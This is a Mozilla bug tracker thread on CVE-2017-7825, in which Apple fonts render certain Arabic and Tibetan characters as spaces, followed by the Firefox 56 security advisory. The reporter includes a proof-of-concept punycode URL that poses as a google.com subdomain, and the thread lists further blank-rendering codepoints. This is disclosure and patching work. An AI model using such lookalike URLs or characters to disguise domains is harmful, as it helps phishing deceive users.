| firefox57 |  | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: chromium.khalil, Assigned: jfkthame)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=40)  [jfkthame](/user_profile?user_id=329583)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/18797ac89f63d453cd480eeec6780e2c?d=mm&size=40)  [chromium.khalil](/user_profile?user_id=469104)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/d949a35ad3900bd0ee47938b23a0cbee?d=mm&size=40)  [dao](/user_profile?user_id=219124)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

10 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (4 keywords, Whiteboard: [adv-main56+][adv-esr52.4+][post-critsmash-triage])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2017-7825

[Keywords:](/describekeywords.cgi)

[csectype-spoof](/buglist.cgi?keywords=csectype-spoof&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[sec-vector](/buglist.cgi?keywords=sec-vector&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main56+][adv-esr52.4+][post-critsmash-triage]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#c15 "7 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | [qe-verify](#a2163947_452604 "7 years ago") | - |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | blocking-fx-sync1.7 | ? |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (2 files)

| [Screen Shot 2017-08-24 at 23.31.13.png](/attachment.cgi?id=8900936)  [7 years ago](#c0)  [Khalil Zhani](/user_profile?user_id=469104)   157.59 KB, image/png |  | [Details](/attachment.cgi?id=8900936&action=edit) |
| --- | --- | --- |
| [Blacklist more invalid characters found in Apple's fonts](/attachment.cgi?id=8903080)  [7 years ago](#c6)  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)   2.05 KB, patch | jrmuizel : [review+](#a574432_309398 "7 years ago")  gchang : [approval-mozilla-beta+](#c12 "7 years ago")  gchang : [approval-mozilla-esr52+](#c12 "7 years ago") | [Details](/attachment.cgi?id=8903080&action=edit) | [Diff](/attachment.cgi?id=8903080&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1393624&attachment=8903080) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Khalil Zhani](/user_profile?user_id=469104)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1393624#c0)• 7 years ago |
|  | |

Attached image
[Screen Shot 2017-08-24 at 23.31.13.png](attachment.cgi?id=8900936)
— [Details](attachment.cgi?id=8900936&action=edit)

After reporting issue 1390980 which is fixed in version 57.0a1 Nightly, we have found another character ([https://www.compart.com/en/unicode/U+0620](https://www.compart.com/en/unicode/U%2B0620)) looks like a 'space' on Mac OS
<http://important-domain.google.com.xn--fgbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.bntk.pl/>

|  | [Khalil Zhani](/user_profile?user_id=469104)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1393624#c1)• 7 years ago |
|  | |

Note: I tested this with macOS X El Capitan 10.11.6

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1393624#c2)• 7 years ago |
|  | |

Looks like this is another character where some of Apple's Chinese fonts (STSong / Songti) incorrectly have a blank glyph.
The same issue also applies to the extended Arabic-script characters 06EE, 06EF and 06FF. And to some (mostly unassigned) Tibetan-block characters: 0F6D 0F6E 0F6F 0F70 0F98 0FBD 0FCD 0FD9..0FFF. (Based on checking the Songti fonts on macOS 10.12.)
This really is an Apple bug, not a Firefox issue, but I guess we can add all these to the exclusion list in gfxMacPlatformFontList.

|  | [Paul Theriault [:pauljt] (no longer reading bugmail)](/user_profile?user_id=434339) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1393624#a353928_434339)• 7 years ago |

Flags: sec-bounty?

|  | [Gervase Markham [:gerv]](/user_profile?user_id=9911) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1393624#c3)• 7 years ago |
|  | |

jfkthame: have we now gone through all the suspect fonts and blacklisted every character which is encoded as a space?
Gerv

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1393624#c4)• 7 years ago |
|  | |

(In reply to Gervase Markham [:gerv] from [comment #3](/show_bug.cgi?id=1393624#c3 "RESOLVED FIXED - Domain spoofing thanks to U+0620 ARABIC LETTER rendered as 'space' on Mac OS"))
> jfkthame: have we now gone through all the suspect fonts and blacklisted
> every character which is encoded as a space?
Not really; that's rather an open-ended project. I found a bunch more in the STSong fonts ([comment 2](/show_bug.cgi?id=1393624#c2 "RESOLVED FIXED - Domain spoofing thanks to U+0620 ARABIC LETTER rendered as 'space' on Mac OS") above), but this may not be exhaustive.
There could easily be additional fonts that have such flaws, but just haven't come to anyone's attention yet. And fonts change with every new OS release... existing fonts are updated, and entirely new fonts may be shipped. In general, of course, we hope that errors are fixed in new releases rather than new ones introduced, but there are no guarantees.

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1393624#c5)• 7 years ago |
|  | |

(In reply to Jonathan Kew (:jfkthame) from [comment #2](/show_bug.cgi?id=1393624#c2 "RESOLVED FIXED - Domain spoofing thanks to U+0620 ARABIC LETTER rendered as 'space' on Mac OS"))
> Looks like this is another character where some of Apple's Chinese fonts
> (STSong / Songti) incorrectly have a blank glyph.
>
> The same issue also applies to the extended Arabic-script characters 06EE,
> 06EF and 06FF.
And 065F.

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1393624#c6)• 7 years ago |
|  | |

Attached patch

[Blacklist more invalid characters found in Apple's fonts](attachment.cgi?id=8903080&action=diff)
— [Details](attachment.cgi?id=8903080&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1393624&attachment=8903080)

This adds all the characters mentioned above (plus a few more I found when trawling through the Songti fonts) to our blacklist.
[Attachment #8903080](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") -
Flags: review?(jmuizelaar)

|  | [Khalil Zhani](/user_profile?user_id=469104)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1393624#c7)• 7 years ago |
|  | |

I think this is Medium severity based on [bug 1390980](/show_bug.cgi?id=1390980 "RESOLVED FIXED - Domain spoofing thanks to U+0F8C rendered as 'space' on Mac OS 10.11").

|  | [Jeff Muizelaar [:jrmuizel]](/user_profile?user_id=309398) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1393624#a574432_309398)• 7 years ago |

[Attachment #8903080](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") -
Flags: review?(jmuizelaar) → review+

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1393624#a574994_329583)• 7 years ago |

Keywords: [csectype-spoof](/buglist.cgi?keywords=csectype-spoof&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---),
[sec-vector](/buglist.cgi?keywords=sec-vector&resolution=---)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1393624#c8)• 7 years ago |
|  | |

<https://hg.mozilla.org/integration/mozilla-inbound/rev/a87b382c21353cb3d8c3f05a87a435bd9bd0901d>

|  | [Wes Kocher (:KWierso) (Not reading bugmail; email directly if needed)](/user_profile?user_id=308534) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1393624#c9)• 7 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/a87b382c2135>Status: UNCONFIRMED → RESOLVEDClosed: 7 years ago
[status-firefox57](/buglist.cgi?f1=cf_status_firefox57&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox57&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → Firefox 57

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1393624#c10)• 7 years ago |
|  | |

I assume we'll want to backport this to Beta/ESR52 as well.Assignee: nobody → jfkthame
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=wontfix)
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=affected)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected)Flags: needinfo?(jfkthame)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1393624#c11)• 7 years ago |
|  | |

Comment on [attachment 8903080](/attachment.cgi?id=8903080 "Blacklist more invalid characters found in Apple's fonts") [[details]](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") [[diff]](/attachment.cgi?id=8903080&action=diff "Blacklist more invalid characters found in Apple's fonts") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1393624&attachment=8903080)
Blacklist more invalid characters found in Apple's fonts
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration:
Not really a Gecko bug, this is a workaround for a buggy Apple font with spurious blank characters that might be used to obscure a spoofed URL.
User impact if declined:
Potential for URL spoofing due to invalid characters in a Chinese font on macOS
Fix Landed on Version: 57
Risk to taking this patch (and alternatives if risky): minimal
String or UUID changes made by this patch: noneFlags: needinfo?(jfkthame)
[Attachment #8903080](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") -
Flags: approval-mozilla-esr52?
[Attachment #8903080](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") -
Flags: approval-mozilla-beta?

|  | [Gerry Chang [:gchang]](/user_profile?user_id=506302) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1393624#c12)• 7 years ago |
|  | |

Comment on [attachment 8903080](/attachment.cgi?id=8903080 "Blacklist more invalid characters found in Apple's fonts") [[details]](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") [[diff]](/attachment.cgi?id=8903080&action=diff "Blacklist more invalid characters found in Apple's fonts") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1393624&attachment=8903080)
Blacklist more invalid characters found in Apple's fonts
Avoid potential for URL spoofing. Beta56+ & ESR52+.
[Attachment #8903080](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") -
Flags: approval-mozilla-esr52?
[Attachment #8903080](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") -
Flags: approval-mozilla-esr52+
[Attachment #8903080](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") -
Flags: approval-mozilla-beta?
[Attachment #8903080](/attachment.cgi?id=8903080&action=edit "Blacklist more invalid characters found in Apple's fonts") -
Flags: approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1393624#c13)• 7 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/fe4bfcfc5db2>
<https://hg.mozilla.org/releases/mozilla-esr52/rev/db3e2bfb7aa7>
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1393624#c14)• 7 years ago |
|  | |

Note this bug (and the similar Tibetan ones) also affect Safari, as one would expect since this is a Mac font bug.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1393624#c15)• 7 years ago |
|  | |

We're going to pay a reduced bounty for this one because we've paid before, but we can't afford to be Apple's Bug Bounty program so this will have to be the last one for these bugs that 1) are due to bad Apple fonts, and 2) also affect Safari.Flags: sec-bounty? → sec-bounty+

|  | [Khalil Zhani](/user_profile?user_id=469104)  Reporter |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1393624#c16)• 7 years ago |
|  | |

See also <https://bugs.chromium.org/p/chromium/issues/detail?id=725660> reproted to Chromium.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1393624#a1122722_1689)• 7 years ago |

Group: firefox-core-security → core-security-release

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1393624#a1823520_280903)• 7 years ago |

Whiteboard: [adv-main56+][adv-esr52.4+]

|  | [Matt Wobensmith [:mwobensmith][:matt:]](/user_profile?user_id=452604) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1393624#a2163947_452604)• 7 years ago |

Flags: qe-verify-Whiteboard: [adv-main56+][adv-esr52.4+] → [adv-main56+][adv-esr52.4+][post-critsmash-triage]

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1393624#a2412866_280903)• 7 years ago |

Alias: CVE-2017-7825

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1393624#a13920741_1689)• 7 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1393624#a213473021_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1393624&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Khalil Zhani](/user_profile?user_id=469104)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_8bc36061_20250125_174643.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2017-21

## Security vulnerabilities fixed in Firefox 56

Announced
September 28, 2017
Impact
critical
Products
Firefox
Fixed in

* Firefox 56

#### [#CVE-2017-7793: Use-after-free with Fetch API](#CVE-2017-7793)

Reporter
Abhishek Arya
Impact
high
##### Description

A use-after-free vulnerability can occur in the Fetch API when the worker or the associated window are freed when still in use, resulting in a potentially exploitable crash.

##### References

* [Bug 1371889](https://bugzilla.mozilla.org/show_bug.cgi?id=1371889)

#### [#CVE-2017-7817: Firefox for Android address bar spoofing through fullscreen mode](#CVE-2017-7817)

Reporter
Raphael Saniyazov
Impact
high
##### Description

A spoofing vulnerability can occur when a page switches to fullscreen mode without user notification, allowing a fake address bar to be displayed. This allows an attacker to spoof which page is actually loaded and in use.
*Note: This attack only affects Firefox for Android. Other operating systems are not affected.*

##### References

* [Bug 1356596](https://bugzilla.mozilla.org/show_bug.cgi?id=1356596)

#### [#CVE-2017-7818: Use-after-free during ARIA array manipulation](#CVE-2017-7818)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when manipulating arrays of Accessible Rich Internet Applications (ARIA) elements within containers through the DOM. This results in a potentially exploitable crash.

##### References

* [Bug 1363723](https://bugzilla.mozilla.org/show_bug.cgi?id=1363723)

#### [#CVE-2017-7819: Use-after-free while resizing images in design mode](#CVE-2017-7819)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur in design mode when image objects are resized if objects referenced during the resizing have been freed from memory. This results in a potentially exploitable crash.

##### References

* [Bug 1380292](https://bugzilla.mozilla.org/show_bug.cgi?id=1380292)

#### [#CVE-2017-7824: Buffer overflow when drawing and validating elements with ANGLE](#CVE-2017-7824)

Reporter
Omair, Andre Weissflog
Impact
high
##### Description

A buffer overflow occurs when drawing and validating elements with the ANGLE graphics library, used for WebGL content. This is due to an incorrect value being passed within the library during checks and results in a potentially exploitable crash.

##### References

* [Bug 1398381](https://bugzilla.mozilla.org/show_bug.cgi?id=1398381)

#### [#CVE-2017-7805: Use-after-free in TLS 1.2 generating handshake hashes](#CVE-2017-7805)

Reporter
Martin Thomson
Impact
high
##### Description

During TLS 1.2 exchanges, handshake hashes are generated which point to a message buffer. This saved data is used for later messages but in some cases, the handshake transcript can exceed the space available in the current buffer, causing the allocation of a new buffer. This leaves a pointer pointing to the old, freed buffer, resulting in a use-after-free when handshake hashes are then calculated afterwards. This can result in a potentially exploitable crash.

##### References

* [Bug 1377618](https://bugzilla.mozilla.org/show_bug.cgi?id=1377618)

#### [#CVE-2017-7812: Drag and drop of malicious page content to the tab bar can open locally stored files](#CVE-2017-7812)

Reporter
Tooru Fujisawa
Impact
moderate
##### Description

If web content on a page is dragged onto portions of the browser UI, such as the tab bar, links can be opened that otherwise would not be allowed to open. This can allow malicious web content to open a locally stored file through `file:` URLs.

##### References

* [Bug 1379842](https://bugzilla.mozilla.org/show_bug.cgi?id=1379842)

#### [#CVE-2017-7814: Blob and data URLs bypass phishing and malware protection warnings](#CVE-2017-7814)

Reporter
François Marier
Impact
moderate
##### Description

File downloads encoded with `blob:` and `data:` URL elements bypassed normal file download checks though the Phishing and Malware Protection feature and its block lists of suspicious sites and files. This would allow malicious sites to lure users into downloading executables that would otherwise be detected as suspicious.

##### References

* [Bug 1376036](https://bugzilla.mozilla.org/show_bug.cgi?id=1376036)

#### [#CVE-2017-7813: Integer truncation in the JavaScript parser](#CVE-2017-7813)

Reporter
Abhishek Arya
Impact
moderate
##### Description

Inside the JavaScript parser, a cast of an integer to a narrower type can result in data read from outside the buffer being parsed. This usually results in a non-exploitable crash, but can leak a limited amount of information from memory if it matches JavaScript identifier syntax.

##### References

* [Bug 1383951](https://bugzilla.mozilla.org/show_bug.cgi?id=1383951)

#### [#CVE-2017-7825: OS X fonts render some Tibetan and Arabic unicode characters as spaces](#CVE-2017-7825)

Reporter
Khalil Zhani
Impact
moderate
##### Description

Several fonts on OS X display some Tibetan and Arabic characters as whitespace. When used in the addressbar as part of an IDN this can be used for domain name spoofing attacks.
*Note: This attack only affects OS X operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1393624](https://bugzilla.mozilla.org/show_bug.cgi?id=1393624)
* [Bug 1390980](https://bugzilla.mozilla.org/show_bug.cgi?id=1390980)

#### [#CVE-2017-7815: Spoofing attack with modal dialogs on non-e10s installations](#CVE-2017-7815)

Reporter
Jose María Acuña
Impact
moderate
##### Description

On pages containing an iframe, the `data:` protocol can be used to create a modal dialog through Javascript that will have an arbitrary domains as the dialog's location, spoofing of the origin of the modal dialog from the user view.
*Note: This attack only affects installations with e10 multiprocess turned off. Installations with e10s turned on do not support the modal dialog functionality.*

##### References

* [Bug 1368981](https://bugzilla.mozilla.org/show_bug.cgi?id=1368981)

#### [#CVE-2017-7816: WebExtensions can load about: URLs in extension UI](#CVE-2017-7816)

Reporter
Kestrel
Impact
moderate
##### Description

WebExtensions could use popups and panels in the extension UI to load an `about:` privileged URL, violating security checks that disallow this behavior.

##### References

* [Bug 1380597](https://bugzilla.mozilla.org/show_bug.cgi?id=1380597)

#### [#CVE-2017-7821: WebExtensions can download and open non-executable files without user interaction](#CVE-2017-7821)

Reporter
Abdulrahman Alqabandi
Impact
moderate
##### Description

A vulnerability where WebExtensions can download and attempt to open a file of some non-executable file types. This can be triggered without specific user interaction for the file download and open actions. This could be used to trigger known vulnerabilities in the programs that handle those document types.

##### References

* [Bug 1346515](https://bugzilla.mozilla.org/show_bug.cgi?id=1346515)

#### [#CVE-2017-7823: CSP sandbox directive did not create a unique origin](#CVE-2017-7823)

Reporter
Jun Kokatsu
Impact
moderate
##### Description

The content security policy (CSP) `sandbox` directive did not create a unique origin for the document, causing it to behave as if the `allow-same-origin` keyword were always specified. This could allow a Cross-Site Scripting (XSS) attack to be launched from unsafe content.

##### References

* [Bug 1396320](https://bugzilla.mozilla.org/show_bug.cgi?id=1396320)

#### [#CVE-2017-7822: WebCrypto allows AES-GCM with 0-length IV](#CVE-2017-7822)

Reporter
Thanh Bui
Impact
low
##### Description

The AES-GCM implementation in WebCrypto API accepts 0-length IV when it should require a length of 1 according to the NIST Special Publication 800-38D specification. This might allow for the authentication key to be determined in some instances.

##### References

* [Bug 1368859](https://bugzilla.mozilla.org/show_bug.cgi?id=1368859)

#### [#CVE-2017-7820: Xray wrapper bypass with new tab and web console](#CVE-2017-7820)

Reporter
Oriol Brufau
Impact
low
##### Description

The `instanceof` operator can bypass the Xray wrapper mechanism. When called on web content from the browser itself or an extension the web content can provide its own result for that operator, possibly tricking the browser or extension into mishandling the element.

##### References

* [Bug 1378207](https://bugzilla.mozilla.org/show_bug.cgi?id=1378207)

#### [#CVE-2017-7811: Memory safety bugs fixed in Firefox 56](#CVE-2017-7811)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Christian Holler, Jason Kratzer, Tobias Schneider, Tyson Smith, David Keeler, Nicolas B. Pierron, Mike Hommey, Ronald Crane, Tooru Fujisawa, and Philipp reported memory safety bugs present in Firefox 55. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 56](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1392105%2C1395919%2C1388113%2C1348955%2C1394522%2C1387659%2C1369560%2C1388045%2C1378658%2C1379414%2C1385112%2C1367497)

#### [#CVE-2017-7810: Memory safety bugs fixed in Firefox 56 and Firefox ESR 52.4](#CVE-2017-7810)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Christoph Diehl, Jan de Mooij, Jason Kratzer, Randell Jesup, Tom Ritter, Tyson Smith, and Sebastian Hengst reported memory safety bugs present in Firefox 55 and Firefox ESR 52.3. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 56 and Firefox ESR 52.4](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1386787%2C1389974%2C1371657%2C1360334%2C1390550%2C1380824%2C1387918%2C1395598)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

